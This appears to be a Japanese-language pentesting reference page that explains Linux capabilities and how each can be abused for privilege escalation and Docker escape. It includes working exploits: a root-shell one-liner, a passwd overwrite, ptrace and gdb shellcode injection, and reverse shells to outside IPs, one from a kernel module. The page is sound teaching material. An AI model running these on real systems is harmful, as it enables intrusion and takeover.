# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilitiesは、**root権限をより小さく独立した単位に分割**し、プロセスに権限の一部だけを付与できるようにします。不要な完全なroot権限を付与しないことで、リスクを最小限に抑えます。

### The Problem:

- 通常のユーザーは権限が制限されているため、rootアクセスを必要とするネットワークソケットのオープンなどの操作に影響があります。

### Capability Sets:

1. **Inherited (CapInh)**:

- **Purpose**: 親プロセスから引き継がれる capabilities を決定します。
- **Functionality**: 新しいプロセスが作成されると、このセットに含まれる親プロセスの capabilities を継承します。プロセスの生成後も特定の権限を維持する場合に便利です。
- **Restrictions**: プロセスは、親プロセスが保有していなかった capabilities を獲得できません。

2. **Effective (CapEff)**:

- **Purpose**: プロセスがその時点で実際に使用している capabilities を表します。
- **Functionality**: さまざまな操作に対する権限を付与するために、kernel が確認する capabilities のセットです。ファイルの場合、このセットは、ファイルの permitted capabilities を有効なものとして扱うかどうかを示すフラグになります。
- **Significance**: effective set は即時の権限チェックに不可欠であり、プロセスが使用できる capabilities のアクティブなセットとして機能します。

3. **Permitted (CapPrm)**:

- **Purpose**: プロセスが保有できる capabilities の最大セットを定義します。
- **Functionality**: プロセスは permitted set の capability を effective set に昇格させ、その capability を使用できるようにします。また、permitted set から capabilities を削除することもできます。
- **Boundary**: プロセスが保有できる capabilities の上限として機能し、事前に定められた権限範囲を超えないようにします。

4. **Bounding (CapBnd)**:

- **Purpose**: プロセスがライフサイクル中に獲得できる capabilities に上限を設定します。
- **Functionality**: プロセスの inheritable set または permitted set に特定の capability が含まれていても、その capability が bounding set にも含まれていなければ獲得できません。
- **Use-case**: このセットは、プロセスが権限昇格できる可能性を制限する場合に特に便利であり、セキュリティの追加レイヤーを提供します。

5. **Ambient (CapAmb)**:
- **Purpose**: 通常はプロセスの capabilities が完全にリセットされる `execve` system call の実行後も、特定の capabilities を維持できるようにします。
- **Functionality**: 関連付けられた file capabilities を持たない non-SUID プログラムでも、特定の権限を保持できるようにします。
- **Restrictions**: このセットの capabilities は inheritable set と permitted set の制約を受けるため、プロセスに許可された権限を超えることはありません。
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
詳細については、以下を確認してください:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

特定のプロセスの capabilities を確認するには、/proc ディレクトリ内の **status** ファイルを使用します。より詳細な情報が提供されるため、ここでは Linux capabilities に関連する情報のみに限定します。\
なお、実行中のすべてのプロセスでは capabilities の情報がスレッドごとに保持され、ファイル・システム上のバイナリでは extended attributes に保存されます。

capabilities は /usr/include/linux/capability.h で定義されています。

現在のプロセスの capabilities は `cat /proc/self/status` または `capsh --print` で確認できます。他のユーザーの capabilities は `/proc/<pid>/status` で確認できます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5行を返します。

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味を成していません。`capsh` utilityを使用すると、これらをcapabilities名にデコードできます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
では、`ping` が使用する **capabilities** を確認しましょう:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
これは機能しますが、別のより簡単な方法もあります。実行中のプロセスの capabilities を確認するには、**getpcaps** tool の後にプロセス ID（PID）を指定するだけです。プロセス ID のリストを指定することもできます。
```bash
getpcaps 1234
```
バイナリにネットワークを sniff するための十分な capabilities（`cap_net_admin` および `cap_net_raw`）を付与した後、`tcpdump` の capabilities をここで確認します（_tcpdump はプロセス 9562 で実行中です_）：
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
ご覧のとおり、指定された capabilities は、バイナリの capabilities を取得する 2 つの方法の結果に対応しています。\
_getpcaps_ ツールは **capget()** system call を使用して、特定の thread で利用可能な capabilities を照会します。この system call では、より詳しい情報を取得するために PID を指定するだけで済みます。

### Binaries Capabilities

Binaries には、実行中に使用できる capabilities を設定できます。たとえば、`ping` binary に `cap_net_raw` capability が設定されていることは非常によくあります。
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
**capabilities が設定されたバイナリは、次の方法で検索できます：**
```bash
getcap -r / 2>/dev/null
```
### capsh による capabilities の削除

\_ping* から CAP*NET_RAW capabilities を削除すると、ping utility は動作しなくなるはずです。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを出すはずです。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーから、ping コマンドが ICMP ソケットを開くことを許可されていないことが明確にわかります。これで、想定どおりに動作していることを確実に確認できました。

### Capabilities の削除

バイナリから capabilities を削除するには、
```bash
setcap -r </path/to/binary>
```
## ユーザーのCapabilities

どうやら、**capabilitiesをユーザーにも割り当てることが可能**なようです。これはおそらく、ユーザーが実行するすべてのプロセスで、そのユーザーのcapabilitiesを使用できることを意味します。\
[こちら](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[こちら](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[こちら](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)に基づくと、ユーザーに特定のcapabilitiesを付与するために設定が必要なファイルはいくつかありますが、各ユーザーにcapabilitiesを割り当てるファイルは`/etc/security/capability.conf`です。\
ファイルの例:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

以下のプログラムをコンパイルすると、**capabilities を提供する環境内で bash shell を起動**できます。
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた ambient binary によって実行される bash** 内では、**新しい capabilities** を確認できます（通常のユーザーは「current」セクションに capabilities を持ちません）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> **許可されたセットと継承可能なセットの両方に存在する capabilities のみ追加できます。**

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries は環境から付与された新しい capabilities を使用しませんが、Capability-dumb binaries はそれらを拒否しないため使用します。** そのため、Capability-dumb binaries は、binaries に capabilities を付与する特殊な環境内では脆弱になります。

## Service Capabilities

デフォルトでは、**root として実行される service にはすべての capabilities が割り当てられます**。場合によっては、これが危険になる可能性があります。\
そのため、**service configuration file** では、service に付与する **capabilities** と、不要な privileges で service を実行しないように、その service を実行する **user** を **指定できます**。
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker Container 内の Capabilities

デフォルトでは、Docker は Container にいくつかの Capabilities を割り当てます。どの Capabilities が割り当てられているかは、次のコマンドを実行するだけで簡単に確認できます。
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities は、**特権操作を実行した後に自身のプロセスを制限したい場合**（例: chroot を設定してソケットに bind した後）に便利です。しかし、悪意のあるコマンドや引数を渡すことで悪用でき、それらは root として実行されます。

`setcap` を使用してプログラムに capabilities を強制的に付与し、`getcap` を使用してこれらを確認できます:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` は capability を Effective および Permitted として追加することを意味します（「-」の場合は削除します）。

システムまたはフォルダー内で capabilities を持つプログラムを特定するには:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

以下の例では、バイナリ `/usr/bin/python2.6` が privesc に対して脆弱であることが確認されています：
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
`tcpdump` が **任意のユーザーによるパケットの sniffing を許可する**ために必要な **Capabilities**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "empty" capabilities の特殊なケース

[docs より](https://man7.org/linux/man-pages/man7/capabilities.7.html): プログラムファイルに空の capability セットを割り当てることができる点に注意してください。これにより、実行したプロセスの effective および saved set-user-ID を 0 に変更する set-user-ID-root プログラムを作成しながら、そのプロセスに capability を一切付与しないことが可能です。つまり、次の条件を満たす binary がある場合:

1. root が所有者ではない
2. `SUID`/`SGID` ビットが設定されていない
3. capability セットが空である（例: `getcap myelf` が `myelf =ep` を返す）

その場合、**その binary は root として実行されます**。

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、device の mount や kernel feature の操作など、広範な **administrative privileges** を持つため、ほぼ root レベルの権限と見なされることがよくあります。システム全体を再現する container には不可欠ですが、**`CAP_SYS_ADMIN` は重大な security challenge をもたらします**。特に containerized environment では、privilege escalation や system compromise につながる可能性があるためです。そのため、使用にあたっては厳格な security assessment と慎重な管理が必要です。**principle of least privilege** に従い attack surface を最小化するため、application-specific container ではこの capability を drop することが強く推奨されます。

**binary による例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用すると、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます：
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使用して **`su` で root になれる**ようになります。

**environment を使用した例（Docker breakout）**

以下を使用して、docker container 内で有効になっている capabilities を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、SYS_ADMIN capability が有効になっていることが確認できます。

- **Mount**

これにより、docker container は **host disk を mount して自由にアクセスできます**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **完全なアクセス**

前の方法では、Docker host のディスクにアクセスできました。\
host で **ssh** サーバーが実行されていることが分かった場合は、Docker host のディスク内に **ユーザーを作成**し、SSH 経由でアクセスできます：
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**これは、ホスト内で実行されているプロセスに shellcode をインジェクトすることで、コンテナから脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするには、コンテナを少なくとも **`--pid=host`** 付きで実行する必要があります。

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供されるデバッグ機能およびシステムコールトレーシング機能、ならびに `process_vm_readv(2)` や `process_vm_writev(2)` などの cross-memory attach 呼び出しを使用する権限を付与します。診断や監視の目的では強力ですが、`ptrace(2)` に対する seccomp filter などの制限手段なしに `CAP_SYS_PTRACE` が有効になっていると、システムの security を大きく損なう可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で示されているように、seccomp による制限など、他の security 制約を回避するために悪用できます。

**binary (Python) を使った例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリを使った例 (gdb)**

`ptrace` capability を持つ `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
gdb経由でメモリにinjectするshellcodeをmsfvenomで作成する
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
gdbでrootプロセスをデバッグし、以前生成したgdbの行をコピー＆ペーストします。
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使用した例（Docker breakout） - もう1つの gdb Abuse**

**GDB** がインストールされている場合（または、例えば `apk add gdb` や `apt install gdb` でインストールできる場合）、**ホストからプロセスを debug** して `system` 関数を呼び出させることができます。（この technique には capability `SYS_ADMIN` も必要です）**。**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
実行された command の出力は確認できませんが、その process によって実行されます（そのため rev shell を取得します）。

> [!WARNING]
> エラー `"No symbol "system" in current context."` が発生した場合は、gdb 経由でプログラムに shellcode を読み込む前の例を確認してください。

**Example with environment (Docker breakout) - Shellcode Injection**

以下を使用して、docker container 内で有効な capabilities を確認できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**ホスト**で実行中の**プロセス**を一覧表示 `ps -eaf`

1. **アーキテクチャ**を取得 `uname -m`
2. アーキテクチャ用の**shellcode**を探す（[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)）
3. **shellcode**をプロセスのメモリに**inject**するための**プログラム**を探す（[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)）
4. プログラム内の**shellcode**を**変更**し、**compile**する `gcc inject.c -o inject`
5. **inject**して**shell**を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、プロセスに**kernel modules（`init_module(2)`、`finit_module(2)`、`delete_module(2)` system calls）を**load**および**unload**する権限を与え、kernelの中核処理に直接アクセスできるようにします。このcapabilityは、kernelへの変更を可能にすることでprivilege escalationやシステム全体の侵害を招き、Linux Security Modulesやcontainer isolationを含むすべてのLinux security mechanismsを回避できるため、重大なsecurity risksをもたらします。
**つまり、ホストマシンのkernelにkernel modulesを**insert**/**remove**できるということです。**

**バイナリを使った例**

次の例では、バイナリ**`python`**にこのcapabilityが付与されています。
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
デフォルトでは、**`modprobe`** コマンドはディレクトリ **`/lib/modules/$(uname -r)`** 内の依存関係リストおよびマップファイルを確認します。\
これを悪用するため、偽の **lib/modules** フォルダーを作成します：
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
次に、以下にある2つの例を参考に **kernel module を compile して copy** し、この folder に配置します：
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
最後に、この kernel module を load するために必要な python code を execute します:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**binaryを使った例2**

以下の例では、binary **`kmod`** にこのcapabilityが付与されています。
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
つまり、**`insmod`** コマンドを使用して kernel module を挿入できます。以下の例に従い、この privilege を悪用して **reverse shell** を取得します。

**Example with environment (Docker breakout)**

docker container 内で有効な capabilities を確認するには、次を実行します。
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力では、**SYS_MODULE** capability が有効になっていることが確認できます。

reverse shell を実行する **kernel module** と、それを **compile** するための **Makefile** を作成します：
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile内の各makeワードの前にある空白文字は、スペースではなく**タブ**でなければなりません！

コンパイルするには`make`を実行します。
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、shell 内で `nc` を起動し、別の shell から **モジュールをロード**すると、`nc` プロセス内で shell を取得できます。
```bash
#Shell 1
